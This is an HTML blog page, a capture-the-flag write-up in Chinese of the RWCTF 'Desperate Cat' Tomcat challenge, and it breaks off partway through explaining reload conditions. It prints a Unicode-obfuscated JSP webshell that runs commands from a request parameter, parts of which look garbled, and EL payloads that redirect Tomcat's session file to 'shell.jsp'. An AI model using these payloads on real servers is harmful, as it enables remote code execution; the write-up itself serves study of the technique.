@@ -1,0 +1,4813 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta name="referrer" content="no-referrer"/>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="HacKerQWQ">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="HacKerQWQ">
+    
+    <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
+    
+    <meta name="description" content="">
+    <meta name="description" content="目录[TOC] 前言跟我一起参加入职培训的师傅找我一起做RealWorld 4th的Desperate Cat，看了writeup，在做题过程中学到了很多，在最后也是成功复现，记录一波。 关键词：  EL表达式 Tomcat Session存储 jsp编译过程 Tomcat reload条件  Desperate Cat背景在这篇推文RWCTF 4th Desperate Cat Writeup中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Despercate Cat 带来的Tomcat利用思路">
+<meta property="og:url" content="https://hackerqwq.github.io/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="目录[TOC] 前言跟我一起参加入职培训的师傅找我一起做RealWorld 4th的Desperate Cat，看了writeup，在做题过程中学到了很多，在最后也是成功复现，记录一波。 关键词：  EL表达式 Tomcat Session存储 jsp编译过程 Tomcat reload条件  Desperate Cat背景在这篇推文RWCTF 4th Desperate Cat Writeup中">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://miro.medium.com/max/875/1*rV4Q98_77Zf9aQtlCBuFHw.png">
+<meta property="og:image" content="https://miro.medium.com/max/875/1*3zWQsZNiBQmAVPim198Wjg.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230211114609018.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230211114729750.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212112818231.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212120030048.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212145329827.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212150124420.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212151203596.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212152411113.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212153545524.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212144808459.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212161344068.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221222159294.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221222423750.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221224056342.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221224702401.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230222004137637.png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRtdiamzOOn4keD7icfORh2B1cUfGGQbAqjxA5ppxmbElR54dStDHiahIn08Kd6UYajzc1QEMiadXsiayQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223214217010.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223014927769.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223225103689.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223231559736.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223231655772.png">
+<meta property="article:published_time" content="2023-02-23T15:23:53.000Z">
+<meta property="article:modified_time" content="2023-02-23T15:25:27.256Z">
+<meta property="article:author" content="HacKerQWQ">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://miro.medium.com/max/875/1*rV4Q98_77Zf9aQtlCBuFHw.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>Despercate Cat 带来的Tomcat利用思路 · HacKerQWQ&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/avatar/picture.jpeg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >HacKerQWQ的博客空间</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Despercate Cat 带来的Tomcat利用思路</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>HacKerQWQ的博客空间</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Despercate Cat 带来的Tomcat利用思路
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Java安全">Java安全</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">4.3k</span>Reading time: <span class="post-count reading-time">19 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2023/02/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            
+<main class="main post-page">
+    <article class="article-entry">
+        <h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>[TOC]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟我一起参加入职培训的师傅找我一起做RealWorld 4th的Desperate Cat，看了writeup，在做题过程中学到了很多，在最后也是成功复现，记录一波。</p>
+<p>关键词：</p>
+<ol>
+<li>EL表达式</li>
+<li>Tomcat Session存储</li>
+<li>jsp编译过程</li>
+<li>Tomcat reload条件</li>
+</ol>
+<h1 id="Desperate-Cat背景"><a href="#Desperate-Cat背景" class="headerlink" title="Desperate Cat背景"></a>Desperate Cat背景</h1><p>在这篇推文<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247488297&idx=1&sn=cc3db8ffe79c0340215d24fbc6800f7d&chksm=96f40c44a1838552d400146795a24fc425e8ff480d05521384ef07600cab85ef666bff97d01f&scene=21#wechat_redirect">RWCTF 4th Desperate Cat Writeup</a>中，作者出了一道名为Desperate Cat的realworld CTF赛题，取材于现实攻防遇到的难点(<del>不得不说，这样的题目才是真正的以赛代练</del>)</p>
+<p>下面是对该赛题的描述：</p>
+<p>存在文件上传功能点</p>
+<ul>
+<li><p>服务端中间件是 Tomcat，可以往 Tomcat Web 目录下写文件；</p>
+</li>
+<li><p>写入的文件名后缀可控、没有检查；</p>
+</li>
+<li><p>写入的文件名前缀不可控，会被替换为随机字符串；</p>
+</li>
+<li><p>可指定文件的写入目录，且写入文件时如果文件所在的目录不存在，会递归进行父目录的创建；</p>
+</li>
+<li><p>写入的文件内容部分可控，且以字符串编码的形式写入（而非直接传递的字节流），并且前后有脏数据；</p>
+</li>
+<li><p>写入的文件内容里如下特殊字符被进行 HTML 转义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp; -&gt; &amp;</span><br><span class="line">&lt; -&gt; &lt;</span><br><span class="line">&#39; -&gt; &#39;</span><br><span class="line">&gt; -&gt; &#39;</span><br><span class="line">&quot; -&gt; &quot;</span><br><span class="line">( -&gt; &amp;#40;</span><br><span class="line">) -&gt; &amp;#41;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>初步思路：</p>
+<blockquote>
+<p> 既然是JavaWeb，最方便的就是写jsp webshell，但是jsp中存在&lt;%%&gt;这样的尖括号，会被转义从而失效，这是难点一；如果抛弃jsp的尖括号采用EL表达式，例如:${pageContext.request.getSession().setAttribute(“a”,pageContext.request.getClass().forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“calc”).getInputStream())},那么又存在括号，也会被转义，这是难点二。</p>
+</blockquote>
+<p><strong>EL表达式从JSP2.0技术开始就内置支持了，不需要web.xml做配置</strong></p>
+<h2 id="voidfyoo预期解"><a href="#voidfyoo预期解" class="headerlink" title="voidfyoo预期解"></a>voidfyoo预期解</h2><h3 id="jsp-unicode尝试"><a href="#jsp-unicode尝试" class="headerlink" title="jsp unicode尝试"></a>jsp unicode尝试</h3><p>对于难点二，可以将jsp全部unicode编码再上传</p>
+<p><img src="https://miro.medium.com/max/875/1*rV4Q98_77Zf9aQtlCBuFHw.png" alt="img"></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt; </span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt; </span><br><span class="line">&lt;% </span><br><span class="line">    \u0069\u0066\u0020\u0028<span class="string">&quot; shaqima&quot;</span>\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d \u0065\u0074\u0065\u0072\u0028<span class="string">&quot;ladypwd&quot;</span>\u0029\u0029\u0029\u0020\u007b</span><br><span class="line">    \u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e \u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074 \u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028<span class="string">&quot;infocmd&quot;</span>\u0029\u002e\u0073\u0070\u006c\u002769<span class="string">&quot;\u0028&quot;</span>\\u0029\u0029\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b </span><br><span class="line">    \u0069\u006e\u0074\u0020\u0072 \u0065\u0074\u0020\u003d\u0020\u002d\u0031\u003b </span><br><span class="line">    \u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0062\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0062 \u0079\u0074\u0065\u005b\u0032\u0030\u0034\u0038\u005d\u003b</span><br><span class="line">    \u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u0028<span class="string">&quot;&lt;pre&gt;&quot;</span>\u0029\u003b </span><br><span class="line">    \u0077\u0068\u0069\u006c\u0065\u0028\u0028\u007452\ u0020\u003d\u0020\u0069\u006e\u002e\u0072\u0065\u0061\u0064\u0028\u0062\u0073\u0029\u0029\u0020\u0021\u003d\u0020\u002d\u0031\u0029\u0020\u007b </span><br><span class="line">    \u006f\ u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0062\u0073\u0029\ u0029\u003b </span><br><span class="line">    \u007d </span><br><span class="line">    \u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u0028<span class="string">&quot;&lt;/pre&gt;&quot;</span>\u0029\u003b </span><br><span class="line">    \u007d </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://miro.medium.com/max/875/1*3zWQsZNiBQmAVPim198Wjg.png" alt="img"></p>
+<p>但是就存在<strong>尖括号</strong>，而纯EL表达式又存在<strong>括号</strong>，难点一和难点二互相制肘。</p>
+<h3 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h3><p>voidfyoo师傅就提出几种思路：</p>
+<ol>
+<li>看 Tomcat JSP 中是否支持类似于 EL 这类具有动态执行能力的其他语法特性；</li>
+<li>看 EL 表达式中是否支持某些特殊编码，利用特殊编码将要转义的字符进行编码来绕过；</li>
+<li>看 EL 表达式中是否可能存在二次解析执行（类似于 Struts2 中之前表达式二次渲染注入的漏洞）；</li>
+<li>在不使用圆括号的情况下，通过 EL 表达式的取值、赋值特性，获取到某些关键的 Tomcat 对象实例，修改它们的属性，造成危险的影响；</li>
+</ol>
+<p>最终使用第四种思路，<strong>通过4个EL表达式修改属性</strong>，完成rce。</p>
+<h3 id="Tomcat-Session保存机制"><a href="#Tomcat-Session保存机制" class="headerlink" title="Tomcat Session保存机制"></a>Tomcat Session保存机制</h3><p>在Tomcat中为了Session数据持久化，会在Catalina退出或者<code>reload</code>时在<code>\work\Catalina\域名\应用名\SESSIONS.ser</code>中存储Session中的数据，在Catalina/reload时，遍历加载各个应用的SESSIONS.ser文件。</p>
+<p>SESSIONS.ser是默认的SESSION持久化文件名，可以在conf/context.xml文件中设置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- web application will be reloaded.                                   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    &lt;Manager pathname=&quot;&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Manager</span> <span class="attr">pathname</span>=<span class="string">&quot;SESS.ser&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先在jsp中设置session的attribute</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    session.setAttribute(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;boolean&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;number&quot;</span>,<span class="number">666</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后手动退出Catalina</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230211114609018.png" alt="image-20230211114609018"></p>
+<p>使用kali下的msf-java_deserializer工具查看内容</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230211114729750.png" alt="image-20230211114729750"></p>
+<p><strong>那么在攻防中拿到了主机权限是不是也可以把SESSIONS.ser文件脱下来看看有没有敏感信息呢</strong></p>
+<h3 id="Catalina退出写入Session文件"><a href="#Catalina退出写入Session文件" class="headerlink" title="Catalina退出写入Session文件"></a>Catalina退出写入Session文件</h3><p>首先是Catalina退出的情况，这时候只需要完成以下三点即可：</p>
+<ol>
+<li>设置pathname(Session文件的保存文件名)</li>
+<li>设置session中的值</li>
+<li>退出Catalina</li>
+</ol>
+<p>上传jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#pageContext.getServletContext().getClassLoader().resources.context.manager.pathname</span><br><span class="line">相当于</span><br><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname&#x3D;&quot;shell.jsp&quot;&#125;</span><br><span class="line">$&#123;sessionScope[param.a]&#x3D;param.b&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入payload(<strong>必须url编码</strong>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;hackerqwq&amp;b&#x3D;%3C%25out.println(&#39;shell&#39;)%3B%25%3E&amp;p&#x3D;D:&#x2F;Tomcat&#x2F;webapps&#x2F;ROOT&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212112818231.png" alt="image-20230212112818231"></p>
+<p>jsp后缀的session文件已经写入，使用SerializationDumper工具查看发现jsp内容已经存在</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212120030048.png" alt="image-20230212120030048"></p>
+<h3 id="reload写入Session文件"><a href="#reload写入Session文件" class="headerlink" title="reload写入Session文件"></a>reload写入Session文件</h3><h4 id="reload原理分析"><a href="#reload原理分析" class="headerlink" title="reload原理分析"></a>reload原理分析</h4><p>在实际环境中不可能靠Tomcat关闭来达到写入Session文件的目的，这样就算shell写入进去了也无法访问，这里就用到了reload的知识点，通过reload同样可以触发Session文件保存机制。</p>
+<p>在<code>org/apache/catalina/session/StandardManager.java</code>中看到这样一段说明</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212145329827.png" alt="image-20230212145329827"></p>
+<p>明确说明在server关闭或者重启、webapp reload的时候都会进行session持久化。</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212150124420.png" alt="image-20230212150124420"></p>
+<p>接着全局搜索reload方法，找到了三种reload()方法</p>
+<ol>
+<li>后台周期性监视Context变化</li>
+<li>manager手动reload</li>
+<li>Host配置</li>
+</ol>
+<p><strong>作者的做法采用的是第一种reload方法</strong>。在<code>backgroudProcess()</code>方法中想要进入<code>reload()</code>方法需要满足以下两个条件</p>
+<ol>
+<li>reloadable设置为true</li>
+<li>modified()方法返回为true</li>
+</ol>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212151203596.png" alt="image-20230212151203596"></p>
+<p>通过google搜索Tomcat reloadable相关信息找到了相关描述</p>
